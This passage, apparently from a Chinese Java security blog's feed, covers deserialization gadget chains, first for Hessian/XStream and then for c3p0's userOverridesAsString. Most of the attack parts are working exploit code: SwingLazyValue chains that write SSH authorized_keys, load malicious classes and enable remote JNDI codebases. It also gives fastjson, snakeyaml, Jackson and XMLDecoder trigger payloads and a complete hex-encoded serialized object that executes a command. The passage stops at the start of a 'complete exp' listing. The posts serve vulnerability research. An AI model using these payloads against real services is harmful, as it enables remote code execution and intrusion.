class="hljs-literal">true</span>);<br>       <span class="hljs-type">Object</span> <span class="hljs-variable">javaUtils</span> <span class="hljs-operator">=</span> JavaUtils.newInstance();<br>          <span class="hljs-type">Method</span> <span class="hljs-variable">bytesToFilename</span> <span class="hljs-operator">=</span> JavaUtils.class.getMethod(<span class="hljs-string">&quot;writeBytesToFilename&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class);<br>       <span class="hljs-type">Method</span> <span class="hljs-variable">invoke</span> <span class="hljs-operator">=</span> MethodUtil.class.getMethod(<span class="hljs-string">&quot;invoke&quot;</span>, Method.class, Object.class, Object[].class);<br>       Object[] ags = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;invoke, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123; bytesToFilename,javaUtils,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123; <span class="hljs-string">&quot;/Users/snake/.ssh/authorized_keys1&quot;</span>,allBytes&#125;&#125;&#125;;<br><span class="hljs-type">SwingLazyValue</span> <span class="hljs-variable">swingLazyValue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;sun.reflect.misc.MethodUtil&quot;</span>,<span class="hljs-string">&quot;invoke&quot;</span>,ags);<br></code></pre></td></tr></table></figure><p>写class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;evil.class&quot;</span>).toPath());<br>SwingLazyValue swingLazyValue= <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;java.lang.System&quot;</span>,<span class="hljs-string">&quot;setProperty&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;(Object)<span class="hljs-string">&quot;jfr.save.generated.asm&quot;</span>,(Object)<span class="hljs-string">&quot;true&quot;</span>&#125;);<br>       <span class="hljs-type">SwingLazyValue</span> <span class="hljs-variable">swingLazyValue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;jdk.jfr.internal.Utils&quot;</span>,<span class="hljs-string">&quot;writeGeneratedASM&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;(Object)<span class="hljs-string">&quot;/tmp/evil/&quot;</span>,bytes&#125;);<br><br>打三次。 开启jfr.save.generated.asm，写class，在加载。<br></code></pre></td></tr></table></figure><h4 id="二、高版本开启jndi出网，在利用。"><a href="#二、高版本开启jndi出网，在利用。" class="headerlink" title="二、高版本开启jndi出网，在利用。"></a>二、高版本开启jndi出网，在利用。</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        三、利用RMIConnector/JdbcRowSetImpl/javax.naming.InitialContext打jndi，高版本先打下面配置，开启出网。(利用java.lang.System.setProperty开启配置)。</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">useCodebaseOnly</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;java.lang.System&quot;</span>,<span class="hljs-string">&quot;setProperty&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;(Object)<span class="hljs-string">&quot;java.rmi.server.useCodebaseOnly&quot;</span>,(Object)<span class="hljs-string">&quot;false&quot;</span>&#125;);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">rmi</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;java.lang.System&quot;</span>,<span class="hljs-string">&quot;setProperty&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;(Object)<span class="hljs-string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>,(Object)<span class="hljs-string">&quot;true&quot;</span>&#125;);<br>/       <span class="hljs-type">Object</span> <span class="hljs-variable">ldap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;java.lang.System&quot;</span>,<span class="hljs-string">&quot;setProperty&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;(Object)<span class="hljs-string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>,(Object)<span class="hljs-string">&quot;true&quot;</span>&#125;);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        uiDefaults.put(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;javax.naming.InitialContext&quot;</span>, <span class="hljs-string">&quot;doLookup&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;rmi://127.0.0.1:1099/remoteExploit8&quot;</span>&#125;));<br></code></pre></td></tr></table></figure><p>还可以高版本打tomcat的el表达式</p><h4 id="三、类加载"><a href="#三、类加载" class="headerlink" title="三、类加载"></a>三、类加载</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-type">Method</span> <span class="hljs-variable">invoke</span> <span class="hljs-operator">=</span> MethodUtil.class.getMethod(<span class="hljs-string">&quot;invoke&quot;</span>, Method.class, Object.class, Object[].class);<br>        Class&lt;?&gt; JVM = Class.forName(<span class="hljs-string">&quot;sun.tracing.dtrace.JVM&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">defineClass</span> <span class="hljs-operator">=</span> JVM.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, ClassLoader.class, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>        defineClass.setAccessible(<span class="hljs-literal">true</span>);<br>        Constructor&lt;?&gt; declaredConstructor = JVM.getDeclaredConstructor();<br>        declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">jvm</span> <span class="hljs-operator">=</span> declaredConstructor.newInstance();<br>        Object[] ags = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;invoke, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123; defineClass,jvm, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;jvm.getClass().getClassLoader(),evil,bcode,<span class="hljs-number">0</span>,bcode.length&#125;&#125;&#125;;<br><br>        <span class="hljs-type">SwingLazyValue</span> <span class="hljs-variable">swingLazyValue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;sun.reflect.misc.MethodUtil&quot;</span>, <span class="hljs-string">&quot;invoke&quot;</span>, ags);<br><span class="hljs-comment">//第二次直接调用加载的方法</span><br><span class="hljs-type">SwingLazyValue</span> <span class="hljs-variable">swingLazyValue1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(evil, <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]);<br>打两次，第一次加载，第二次调用<br></code></pre></td></tr></table></figure><p>还有一些becl什么都是同理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        ##加载becl，第一次加载字节码，第二次调用</span><br>        <span class="hljs-type">JavaClass</span> <span class="hljs-variable">javaClass</span> <span class="hljs-operator">=</span> Repository.lookupClass(calc.class);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;$$BCEL$$&quot;</span>+ Utility.encode(javaClass.getBytes(), <span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">_main</span> <span class="hljs-operator">=</span> JavaWrapper.class.getMethod(<span class="hljs-string">&quot;_main&quot;</span>, String[].class);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">invoke</span> <span class="hljs-operator">=</span> MethodUtil.class.getMethod(<span class="hljs-string">&quot;invoke&quot;</span>, Method.class, Object.class, Object[].class);<br>        Object[] ags = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;invoke, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123; _main,<span class="hljs-keyword">new</span> <span class="hljs-title class_">JavaWrapper</span>(),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;payload&#125;&#125;&#125;&#125;;<br><br>        <span class="hljs-type">SwingLazyValue</span> <span class="hljs-variable">swingLazyValue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;sun.reflect.misc.MethodUtil&quot;</span>,<span class="hljs-string">&quot;invoke&quot;</span>,ags);<br><span class="hljs-comment">//        SwingLazyValue swingLazyValue = new SwingLazyValue(&quot;_main()&quot;,null,null);</span><br></code></pre></td></tr></table></figure><h4 id="四、打二次反序列"><a href="#四、打二次反序列" class="headerlink" title="四、打二次反序列"></a>四、打二次反序列</h4><p><img src="image-20240129020010080.png" alt="image-20240129020010080"></p><p>没过滤javax.management.remote.rmi</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;jdk的序列化bin&quot;</span>);<br><span class="hljs-type">byte</span>[] fileBytes = Files.readAllBytes(file.toPath());<br><span class="hljs-type">String</span> <span class="hljs-variable">base64</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(fileBytes);<br><br><span class="hljs-type">JMXServiceURL</span> <span class="hljs-variable">jmxServiceURL</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMXServiceURL</span>(<span class="hljs-string">&quot;service:jmx:rmi://&quot;</span>);<br>setFieldValue(jmxServiceURL, <span class="hljs-string">&quot;urlPath&quot;</span>, <span class="hljs-string">&quot;/stub/&quot;</span>+base64);<br><span class="hljs-type">RMIConnector</span> <span class="hljs-variable">rmiConnector</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIConnector</span>(jmxServiceURL, <span class="hljs-literal">null</span>);<br><span class="hljs-type">Method</span> <span class="hljs-variable">connect</span> <span class="hljs-operator">=</span> rmiConnector.getClass().getMethod(<span class="hljs-string">&quot;connect&quot;</span>);<br><span class="hljs-type">Method</span> <span class="hljs-variable">invoke</span> <span class="hljs-operator">=</span> MethodUtil.class.getMethod(<span class="hljs-string">&quot;invoke&quot;</span>, Method.class, Object.class, Object[].class);<br>Object[] ags = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;invoke, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123; connect,rmiConnector, <span class="hljs-literal">null</span>&#125;&#125;;<br></code></pre></td></tr></table></figure><p>打RMIConnector的二次。需要注意二次使用jdk的序列化，不是hessian的。</p><p>以上未尝试复现，纯理论，实战可能需要改改。</p><p>总后致敬<strong>wh1t3p1g</strong>，都是XStream的链子。</p><h3 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h3><p><a href="https://yml-sec.top/2022/04/20/apachedubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/">https://yml-sec.top/2022/04/20/apachedubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/</a></p><p><a href="https://guokeya.github.io/post/psaIZKtC4/">https://guokeya.github.io/post/psaIZKtC4/</a></p><p><a href="https://su18.org/post/hessian/">https://su18.org/post/hessian/</a></p><p><a href="https://blog.0kami.cn/blog/2021/xstream_blacklist_bypass/">https://blog.0kami.cn/blog/2021/xstream_blacklist_bypass/</a></p><h3 id="补"><a href="#补" class="headerlink" title="补"></a>补</h3><p><a href="https://github.com/sofastack/sofa-rpc/security/advisories/GHSA-7q8p-9953-pxvr">https://github.com/sofastack/sofa-rpc/security/advisories/GHSA-7q8p-9953-pxvr</a></p><p><img src="image-20240201163644390.png" alt="image-20240201163644390"></p><p>官网写的小于5.11.1，启明写的小于5.12.0，那没事了。</p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p><p>​</p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二次反序列化学习(二)</title>
    <link href="/2024/01/19/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E4%BA%8C/"/>
    <url>/2024/01/19/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="二次反序列化学习（二）"><a href="#二次反序列化学习（二）" class="headerlink" title="二次反序列化学习（二）"></a>二次反序列化学习（二）</h1><p>网络安全在线讨口子</p><p><img src="image-20240119214240522.png" alt="image-20240119214240522"></p><h2 id="c3p0"><a href="#c3p0" class="headerlink" title="c3p0"></a>c3p0</h2><p>​c3p0是用于创建和管理连接，利用“池”的方式复用连接减少资源开销，和其他数据源一样，也具有连接数控制、连接可靠性测试、连接泄露控制、缓存语句等功能。</p><h3 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h3><p>com&#x2F;mchange&#x2F;v2&#x2F;c3p0&#x2F;impl&#x2F;WrapperConnectionPoolDataSourceBase.java</p><p><img src="image-20240119221947295.png" alt="image-20240119221947295"></p><p><img src="image-20240119220920017.png" alt="image-20240119220920017"></p><p>这个类的javaBean有个userOverridesAsString。还是个抽象类。</p><p>主要判断传的值和userOverridesAsString属性值是否相等或者其中一个为null就会执行if代码块</p><p>java&#x2F;beans&#x2F;VetoableChangeSupport.java#fireVetoableChange()</p><p><img src="image-20240119222708517.png" alt="image-20240119222708517"></p><p><img src="image-20240119222719297.png" alt="image-20240119222719297"></p><p>进行赋值。</p><p><img src="image-20240119222428577.png" alt="image-20240119222428577"></p><p><img src="image-20240119222505926.png" alt="image-20240119222505926"></p><p>com&#x2F;mchange&#x2F;v2&#x2F;c3p0&#x2F;WrapperConnectionPoolDataSource.java#vetoableChange()</p><p><img src="image-20240119222956907.png" alt="image-20240119222956907"></p><p>然后获取里event的newvalue。</p><p>com&#x2F;mchange&#x2F;v2&#x2F;c3p0&#x2F;impl&#x2F;C3P0ImplUtils.java#parseUserOverridesAsString()</p><p><img src="image-20240119223053628.png" alt="image-20240119223053628"></p><p>然后就是获取到的newvalue进行截取。</p><p><img src="image-20240119223320091.png" alt="image-20240119223320091"></p><p><img src="image-20240119223433557.png" alt="image-20240119223433557"></p><p>注意这里的索引，所以HexAsciiSerializedMap和最后面要补一位字符。hex是2字节。</p><p>然后把截取的hex转byte数组。</p><p><img src="image-20240119223744487.png" alt="image-20240119223744487"></p><p>然后就是进行反序列化。</p><p>由于WrapperConnectionPoolDataSource这个类是抽象类，所以我们要找一个继承这个类，然后没有setUserOverridesAsString()这个方法。这样我们调用setUserOverridesAsString时就会去找抽象类的这个方法。</p><p><strong>com&#x2F;mchange&#x2F;v2&#x2F;c3p0&#x2F;WrapperConnectionPoolDataSource.java</strong></p><p>这个类符合这个条件</p><p><img src="image-20240119224142472.png" alt="image-20240119224142472"></p><h3 id="0x02-一些触发链"><a href="#0x02-一些触发链" class="headerlink" title="0x02 一些触发链"></a>0x02 一些触发链</h3><p>​我们知道fastjson、snayaml、json反序列化都是调用javaBean的set方法。所以就有一下exp</p><h4 id="一、fastjson"><a href="#一、fastjson" class="headerlink" title="一、fastjson &lt;&#x3D;1.2.47 反序列化"></a>一、fastjson &lt;&#x3D;1.2.47 反序列化</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-type">String</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> fileToHex(<span class="hljs-string">&quot;rome&quot;</span>);<br><span class="hljs-comment">//        一、fastjson触发，1.2.47一下。属实鸡肋～</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;rand1\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.Class\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;val\&quot;: \&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;rand2\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;userOverridesAsString\&quot;: \&quot;HexAsciiSerializedMap2&quot;</span>+exp+<span class="hljs-string">&quot;2\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parseObject(json);<br></code></pre></td></tr></table></figure><p><img src="image-20240119225953014.png" alt="image-20240119225953014"></p><p>占位符，随便写个1字符都行</p><h4 id="二、snakeyaml-反序列化-（不用SafeConstructor构造）"><a href="#二、snakeyaml-反序列化-（不用SafeConstructor构造）" class="headerlink" title="二、snakeyaml 反序列化 （不用SafeConstructor构造）"></a>二、snakeyaml 反序列化 （不用SafeConstructor构造）</h4><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-comment">//       二、利用snakeyaml触发，只要 snakeyaml构造器没有使用SafeConstructor就可以触发，相对fastjson，但是yaml反序列一般都在后台，只能说半斤八两。</span><br>        <span class="hljs-keyword">String</span> payload = <span class="hljs-string">&quot;!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n&quot;</span> +<br>                <span class="hljs-string">&quot;userOverridesAsString: HexAsciiSerializedMap@&quot;</span> + exp + <span class="hljs-string">&#x27;@&#x27;</span>;<br><br><span class="hljs-comment">//        SafeConstructor safeConstructor = new SafeConstructor();</span><br><span class="hljs-comment">//        Yaml yaml = new Yaml(safeConstructor);</span><br>        Yaml yaml = <span class="hljs-keyword">new</span> <span class="hljs-type">Yaml</span>();<br>        yaml.load(payload);<br></code></pre></td></tr></table></figure><h4 id="三、Jackson-2-8-10反序列化-更加鸡肋"><a href="#三、Jackson-2-8-10反序列化-更加鸡肋" class="headerlink" title="三、Jackson &lt; 2.8.10反序列化 更加鸡肋"></a>三、Jackson &lt; 2.8.10反序列化 更加鸡肋</h4><p>Jackson-databind 支持 <a href="https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization">Polymorphic Deserialization</a> 特性（默认情况下不开启）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> Object object;<br>&#125;<br><span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;object\&quot;:[\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&#123;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span>+ exp + <span class="hljs-string">&quot;;\&quot;&#125;]&#125;&quot;</span>;<br>        System.out.println(poc);<br>        <span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">objectMapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<br>        objectMapper.enableDefaultTyping();<br>        objectMapper.readValue(poc, Person.class);<br>    &#125;<br><br></code></pre></td></tr></table></figure><h4 id="四、XML反序列-（说实话都xml反序列化了，随便干了）"><a href="#四、XML反序列-（说实话都xml反序列化了，随便干了）" class="headerlink" title="四、XML反序列 （说实话都xml反序列化了，随便干了）"></a>四、XML反序列 （说实话都xml反序列化了，随便干了）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;calc.xml&quot;</span>);<br><span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file);<br><span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(fis);<br><span class="hljs-type">XMLDecoder</span> <span class="hljs-variable">xmlDecoder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLDecoder</span>(bis);<br>xmlDecoder.readObject();<br>xmlDecoder.close();<br></code></pre></td></tr></table></figure><p>xmlpoc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;java&gt;<br>    &lt;object class=<span class="hljs-string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span>&gt;<br>        &lt;<span class="hljs-keyword">void</span> method=<span class="hljs-string">&quot;setUserOverridesAsString&quot;</span>&gt;<br>                &lt;string&gt;HexAsciiSerializedMap:aced00057372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0008707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000017372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e000578700000003774000c636f6d2e7365722e526f6d65740009526f6d652e6a6176617400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00077872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e0015787372002a636f6d2e73756e2e73796e6469636174696f6e2e666565642e696d706c2e546f537472696e674265616e09f58e4a0f23ee310200024c000a5f6265616e436c6173737400114c6a6176612f6c616e672f436c6173733b4c00045f6f626a71007e000178707672001d6a617661782e786d6c2e7472616e73666f726d2e54656d706c61746573000000000000000000000078707372003a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c09574fc16eacab3303000649000d5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785b000a5f62797465636f6465737400035b5b425b00065f636c6173737400125b4c6a6176612f6c616e672f436c6173733b4c00055f6e616d6571007e00054c00115f6f757470757450726f706572746965737400164c6a6176612f7574696c2f50726f706572746965733b787000000000ffffffff757200035b5b424bfd19156767db37020000787000000001757200025b42acf317f8060854e0020000787000000192cafebabe000000340019010005726f6d6531070001010040636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f41627374726163745472616e736c65740700030100083c636c696e69743e010003282956010004436f64650100116a6176612f6c616e672f52756e74696d6507000801000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b0c000a000b0a0009000c0100126f70656e202d612063616c63756c61746f7208000e01000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0c001000110a000900120100063c696e69743e0c001400060a0004001501000a536f7572636546696c6501000a726f6d65312e6a6176610021000200040000000000020008000500060001000700000016000200000000000ab8000d120fb6001357b100000000000100140006000100070000001100010001000000052ab70016b10000000000010017000000020018707400046e616d657077010078;&lt;/string&gt;<br>        &lt;/<span class="hljs-keyword">void</span>&gt;<br>    &lt;/object&gt;<br>&lt;/java&gt;<br></code></pre></td></tr></table></figure><p>水平有限，列出四种触发，纯纯鸡肋。</p><h3 id="0x03-完整exp"><a href="#0x03-完整exp" class="headerlink" title="0x03 完整exp"></a>0x03 完整exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 